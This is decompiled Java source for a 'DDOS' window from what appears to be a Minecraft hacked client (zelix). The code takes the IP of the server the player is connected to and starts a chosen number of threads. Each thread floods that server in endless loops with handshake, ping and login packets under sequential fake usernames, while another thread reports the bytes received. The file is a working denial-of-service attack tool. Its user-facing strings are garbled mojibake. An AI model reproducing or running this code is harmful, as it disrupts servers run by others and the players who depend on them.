package zelix.gui.others;

import javax.swing.border.*;
import java.awt.*;
import javax.swing.*;
import java.awt.event.*;
import zelix.otherhacks.net.wurstclient.forge.utils.*;
import zelix.utils.*;
import zelix.hack.hacks.*;
import java.net.*;
import com.google.gson.*;
import java.io.*;

public class DDOSWindow extends JFrame
{
    public static long data;
    public static String[] part1;
    public static int port;
    public static byte[] hand;
    public static byte[] login;
    public static byte[] ping;
    public static byte[] pack;
    public static int version;
    public static long killT;
    public static long point;
    public static String text;
    private JPanel contentPane;
    
    public static void main(final String[] args) {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    final DDOSWindow frame = new DDOSWindow();
                    frame.setVisible(true);
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }
    
    public DDOSWindow() {
        this.setTitle("DDOS");
        this.setBounds(100, 100, 450, 300);
        (this.contentPane = new JPanel()).setBorder(new EmptyBorder(5, 5, 5, 5));
        this.setContentPane(this.contentPane);
        this.contentPane.setLayout(null);
        final JTextArea textArea = new JTextArea();
        textArea.setBackground(Color.WHITE);
        textArea.setToolTipText("\ufffd\ufffd\ufffd\ufffd\ufffd\u0138\ufffd\ufffd\ufffd\ufffd\u05b7\ufffd");
        textArea.setBounds(0, 39, 434, 24);
        this.contentPane.add(textArea);
        final JTextArea wversion = new JTextArea();
        wversion.setBackground(Color.WHITE);
        wversion.setToolTipText("\ufffd\u6c7e\ufffd\ufffd");
        wversion.setBounds(0, 39, 434, 24);
        this.contentPane.add(wversion);
        final JButton btnNewButton = new JButton("Run");
        btnNewButton.setBounds(10, 74, 103, 25);
        this.contentPane.add(btnNewButton);
        btnNewButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(final ActionEvent e) {
                ChatUtils.message("\ufffd\ufffd\u02bc");
                final String ip = Wrapper.INSTANCE.mc().getCurrentServerData().serverIP.toLowerCase();
                DDOSWindow.part1 = ip.split(":");
                DDOSWindow.port = Integer.parseInt(DDOSWindow.part1[1]);
                final int num = (int)(Object)ServerCrasher.threadNum.getValue();
                ChatUtils.message("\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd");
                try {
                    ChatUtils.message("\ufffd\ufffd\ufffd\u0435\ufffd\u04bb\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd");
                    ByteArrayOutputStream b = new ByteArrayOutputStream();
                    DataOutputStream handshake = new DataOutputStream(b);
                    handshake.write(0);
                    DDOSWindow.writeVarInt(handshake, -1);
                    DDOSWindow.writeVarInt(handshake, DDOSWindow.part1[0].length());
                    handshake.writeBytes(DDOSWindow.part1[0]);
                    handshake.writeShort(DDOSWindow.port);
                    DDOSWindow.writeVarInt(handshake, 1);
                    DDOSWindow.hand = b.toByteArray();
                    b = new ByteArrayOutputStream();
                    handshake = new DataOutputStream(b);
                    handshake.write(1);
                    handshake.writeLong(Long.MAX_VALUE);
                    DDOSWindow.ping = b.toByteArray();
                    b = new ByteArrayOutputStream();
                    handshake = new DataOutputStream(b);
                    handshake.write(0);
                    DDOSWindow.pack = b.toByteArray();
                }
                catch (Exception var5) {
                    var5.printStackTrace();
                }
                ChatUtils.message("\ufffd\u6c7e\ufffd\ufffd\ufffd\ufffd\ufffd");
                boolean lock = true;
                try {
                    final Socket s1 = new Socket(DDOSWindow.part1[0], DDOSWindow.port);
                    final InputStream is = s1.getInputStream();
                    final DataInputStream di = new DataInputStream(is);
                    final OutputStream os = s1.getOutputStream();
                    final DataOutputStream dos = new DataOutputStream(os);
                    DDOSWindow.writeVarInt(dos, DDOSWindow.hand.length);
                    dos.write(DDOSWindow.hand);
                    DDOSWindow.writeVarInt(dos, DDOSWindow.pack.length);
                    dos.write(DDOSWindow.pack);
                    dos.flush();
                    DDOSWindow.data += DDOSWindow.readVarInt(di);
                    DDOSWindow.readVarInt(di);
                    final byte[] temp1 = new byte[DDOSWindow.readVarInt(di)];
                    di.readFully(temp1);
                    final String motdT = new String(temp1);
                    final JsonParser json = new JsonParser();
                    final JsonElement part5 = json.parse(motdT);
                    final JsonElement part6 = part5.getAsJsonObject().get("version");
                    ChatUtils.message("\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u6c7e:" + part6.getAsJsonObject().get("name").getAsString() + ",\u042d\ufffd\ufffd\u6c7e\ufffd\ufffd:" + part6.getAsJsonObject().get("protocol").getAsInt());
                    DDOSWindow.version = part6.getAsJsonObject().get("protocol").getAsInt();
                    di.close();
                    is.close();
                    dos.close();
                    os.close();
                    s1.close();
                }
                catch (Exception e2) {
                    lock = false;
                    e2.printStackTrace();
                    ChatUtils.message("\u033d\ufffd\ufffd\u02a7\ufffd\u0723\ufffd\ufffd\ufffd\ufffd\u05b6\ufffd\ufffd\ufffd\ufffd\ufffd\u042d\ufffd\ufffd\u6c7e\ufffd\ufffd:");
                    DDOSWindow.version = Integer.parseInt(wversion.getText());
                }
                if (lock) {
                    ChatUtils.message("\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0237\ufffd\ufffd\u042d\ufffd\ufffd\u6c7e\ufffd\ufffd:");
                    DDOSWindow.version = Integer.parseInt(wversion.getText());
                }
                try {
                    final ByteArrayOutputStream b = new ByteArrayOutputStream();
                    final DataOutputStream handshake = new DataOutputStream(b);
                    handshake.write(0);
                    DDOSWindow.writeVarInt(handshake, DDOSWindow.version);
                    DDOSWindow.writeVarInt(handshake, DDOSWindow.part1[0].length());
                    handshake.writeBytes(DDOSWindow.part1[0]);
                    handshake.writeShort(DDOSWindow.port);
                    DDOSWindow.writeVarInt(handshake, 2);
                    DDOSWindow.login = b.toByteArray();
                }
                catch (Exception e3) {
                    e3.printStackTrace();
                }
                ChatUtils.message("\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u07f3\ufffdPS:\ufffd\ufffd\u02b1\ufffd\ufffd\ufffd\ufffd\u02be\"[MineCraftHackDOS]>0byte\"\ufffd\ufffd\u03e2\ufffd\ufffd\u03aa\ufffd\ufffd\ufffd\ufffd\u02a7\ufffd\ufffd");
                final Runnable thread4 = new Thread4();
                final Thread thread5 = new Thread(thread4);
                thread5.start();
                for (int i = 1; i <= num; ++i) {
                    final Runnable thread6 = new Thread1();
                    final Thread thread7 = new Thread(thread6);
                    thread7.start();
                }
            }
        });
    }
    
    public static void writeVarInt(final DataOutputStream out, int paramInt) throws IOException {
        while ((paramInt & 0xFFFFFF80) != 0x0) {
            out.writeByte((paramInt & 0x7F) | 0x80);
            paramInt >>>= 7;
        }
        out.writeByte(paramInt);
    }
    
    public static int readVarInt(final DataInputStream in) throws IOException {
        int i = 0;
        int j = 0;
        while (true) {
            final int k = in.readByte();
            i |= (k & 0x7F) << j++ * 7;
            if (j > 5) {
                throw new RuntimeException("VarInt\u032b\ufffd\ufffd");
            }
            if ((k & 0x80) != 0x80) {
                return i;
            }
        }
    }
    
    static {
        DDOSWindow.data = 0L;
        DDOSWindow.version = -1;
        DDOSWindow.killT = 0L;
        DDOSWindow.point = 0L;
        DDOSWindow.text = "";
    }
    
    class Thread1 implements Runnable
    {
        @Override
        public void run() {
            while (true) {
                try {
                    while (true) {
                        Socket s = new Socket(DDOSWindow.part1[0], DDOSWindow.port);
                        InputStream is = s.getInputStream();
                        DataInputStream di = new DataInputStream(is);
                        OutputStream os = s.getOutputStream();
                        DataOutputStream dos = new DataOutputStream(os);
                        DDOSWindow.writeVarInt(dos, DDOSWindow.hand.length);
                        dos.write(DDOSWindow.hand);
                        DDOSWindow.writeVarInt(dos, DDOSWindow.pack.length);
                        dos.write(DDOSWindow.pack);
                        dos.flush();
                        DDOSWindow.data += DDOSWindow.readVarInt(di);
                        DDOSWindow.readVarInt(di);
                        final byte[] temp1 = new byte[DDOSWindow.readVarInt(di)];
                        di.readFully(temp1);
                        try {
                            DDOSWindow.writeVarInt(dos, DDOSWindow.ping.length);
                            dos.write(DDOSWindow.ping);
                            dos.flush();
                            DDOSWindow.data += DDOSWindow.readVarInt(di);
                            DDOSWindow.readVarInt(di);
                            di.readLong();
                        }
                        catch (Exception ex) {}
                        di.close();
                        is.close();
                        dos.close();
                        os.close();
                        s.close();
                        s = new Socket(DDOSWindow.part1[0], DDOSWindow.port);
                        is = s.getInputStream();
                        di = new DataInputStream(is);
                        os = s.getOutputStream();
                        dos = new DataOutputStream(os);
                        DDOSWindow.writeVarInt(dos, DDOSWindow.login.length);
                        dos.write(DDOSWindow.login);
                        final ByteArrayOutputStream b = new ByteArrayOutputStream();
                        final DataOutputStream handshake = new DataOutputStream(b);
                        handshake.write(0);
                        final String temp2 = DDOSWindow.text + DDOSWindow.point;
                        ++DDOSWindow.point;
                        DDOSWindow.writeVarInt(handshake, temp2.length());
                        handshake.writeBytes(temp2);
                        final byte[] username = b.toByteArray();
                        DDOSWindow.writeVarInt(dos, username.length);
                        dos.write(username);
                        dos.flush();
                        s.setSoTimeout(1500);
                        try {
                            while (true) {
                                final int length = DDOSWindow.readVarInt(di);
                                DDOSWindow.data += length;
                                final byte[] lj = new byte[length];
                                di.readFully(lj);
                            }
                        }
                        catch (Exception e) {
                            di.close();
                            is.close();
                            dos.close();
                            os.close();
                            s.close();
                        }
                    }
                }
                catch (Exception e2) {
                    ++DDOSWindow.killT;
                    continue;
                }
            }
        }
    }
    
    class Thread4 implements Runnable
    {
        @Override
        public void run() {
            try {
                while (true) {
                    Thread.sleep(3000L);
                    if (DDOSWindow.data >= 1073741824L) {
                        final double a = DDOSWindow.data / 1.073741824E9;
                        ChatUtils.warning("[MineCraftHackDOS]>" + a + "kb," + DDOSWindow.killT + "thread");
                    }
                    else if (DDOSWindow.data >= 1048576L) {
                        final double a = DDOSWindow.data / 1048576.0;
                        ChatUtils.warning("[MineCraftHackDOS]>" + a + "mb," + DDOSWindow.killT + "thread");
                    }
                    else if (DDOSWindow.data >= 1024L) {
                        final double a = DDOSWindow.data / 1024.0;
                        ChatUtils.warning("[MineCraftHackDOS]>" + a + "kb," + DDOSWindow.killT + "thread");
                    }
                    else {
                        if (DDOSWindow.data >= 1024L) {
                            continue;
                        }
                        ChatUtils.warning("[MineCraftHackDOS]>" + DDOSWindow.data + "byte," + DDOSWindow.killT + "thread");
                    }
                }
            }
            catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
